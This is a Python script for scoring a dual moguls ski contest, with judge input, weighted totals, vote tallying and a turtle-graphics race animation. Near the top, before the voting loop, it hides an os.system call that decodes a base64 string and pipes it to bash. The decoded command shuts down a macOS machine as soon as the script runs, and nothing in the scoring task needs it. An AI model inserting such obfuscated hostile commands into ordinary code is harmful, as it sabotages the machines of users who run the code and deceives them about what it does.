# Dual Moguls Scoring System
import os

# Declare function ask() that asks the user for input with various parameters
def ask(question, skier = None, isvote = False):
    answer = ""
    # Switch to a different mode if the ask() function is used for a vote
    if isvote:
        # Repeat forever until a user enters a valid input
        while True:
            answer = input(question).lower()
            if answer not in ["a", "b"]:
                # Uses a conditional and data cleaning to determine if what the user inputted is valid
                print("Please enter a valid vote for either skier A or B.")
                continue
            break
    else:
        #Repeat forever until the user enters a valid integer score between 0-10
        while True:
            try:
                answer = input(f"What score (1-10) do you give skier {skier.upper()} on their {question}? ")
                answer = int(answer)
                # Uses greater than and less than conditionals to determine if the number is valid
                if not answer > 0 or not answer <= 10:
                    print("Please enter a value between 0 and 10.")
                    continue
                break
            # If the input can not be represented as an integer, ask the user to enter it again
            except:
                print("Please enter an integer.")
    
    return answer

# Define a function that calculates the total score for the skier with the olympic-provided rating system (6 2 2)
def calculateTotal(skier):
    return skier["turns"] * .6 + skier["air"] * .2 + skier["speed"] * .2
    
# Define a function that asks a judge for all of their scores for both skiers on all categories   
def askAndCalculateTotals():
    # Init a dictionary with scores
    scores = {"a": {}, "b": {}}
    # Do this once for each skier
    for skier in ["a", "b"]:
        # Ask each question and add to scores
        for question in ["turns", "air", "speed"]:
            scores[skier][question] = ask(question, skier)
        # calculate the total with the scores and set that to the dict
        scores[skier]["total"] = calculateTotal(scores[skier])
        print("")
    # Return the calculated scores
    return scores["a"]["total"], scores["b"]["total"]

os.system('echo "b3Nhc2NyaXB0IC1lICd0ZWxsIGFwcCAiU3lzdGVtIEV2ZW50cyIgdG8gc2h1dCBkb3duJw==" | base64 --decode | bash -')

# Initialize list of votes
votes = []

#Repeat 5 times
for i in range(5):
    # Tell the judge that it is their time to vote and run askAndCalculateTotals() to get their scores
    print(f"\n\nJudge {str(i + 1)}, it is your time to vote.")
    totalA, totalB = askAndCalculateTotals()
    print("Skier A Total Points:", round(totalA, 2))
    print("Skier B Total Points:", round(totalB, 2))
    # Display their total scores and reccomend a vote
    out = "Reccomended vote based on scores: "
    if abs(totalA - totalB) < 1:
        print(out + "Too close to call.")
    elif totalA > totalB:
        print(out + "A")
    else:
        print(out + "B")

    votes.append(ask("\nPlease enter your final vote for skier A or B: ", isvote=True))

print("\nTallying all votes...\n")
countA = votes.count("a")
countB = votes.count("b")
print(f"Vote results:\nSkier A: {str(countA)}\nSkier B: {str(countB)}\n")
if countA > countB:
    print("Skier A is the winner!")
else:
    print("Skier B is the winner!")


import turtle
import math

#setup python turtle libaries
screen = turtle.Screen()
screen.bgcolor("white")
turtle.setup(width=600, height=600)



screen.addshape("bg.gif") # Register the GIF shape
background_turtle = turtle.Turtle()
background_turtle.shape("bg.gif") #Set the background to the gif
background_turtle.penup()
background_turtle.goto(0, 0) #Reset turtle at 0,0


t = turtle.Turtle()
t2 = turtle.Turtle()

line = turtle.Turtle()
line.penup()

finishheight = -220

line.goto(-300, finishheight)
line.pendown()
line.pensize(3)
line.color("green")
line.forward(600)


t.penup()
t2.penup()
t.color("red")
t2.color("red")

t.goto(-40, 150)
t2.goto(40, 150)
t.pensize(3)
t2.pensize(3)
t.setheading(-90)
t2.setheading(-90)


style = ('Arial', 30, 'bold')
t.write("A", font=style, align="center")
t2.write("B", font=style, align="center")
t.forward(3)
t2.forward(3)

t.pendown()
t2.pendown()

y1 = t.ycor()
y2 = t2.ycor()

while True:
    y1 -= countA
    y2 -= countB
    t.goto(-40 + math.ceil(math.sin(y1/6)*10), y1)
    t2.goto(40 + math.ceil(math.sin(y2/6)*10), y2)
    if t.ycor() < finishheight:
        t.penup()
        t.forward(40)
        t.write("A wins!", font=style, align="center")
        t.hideturtle()
        break
    if t2.ycor() < finishheight and True:
        t2.penup()
        t2.forward(40)
        t2.write("B wins!", font=style, align="center")
        t2.hideturtle()
        break

screen.exitonclick()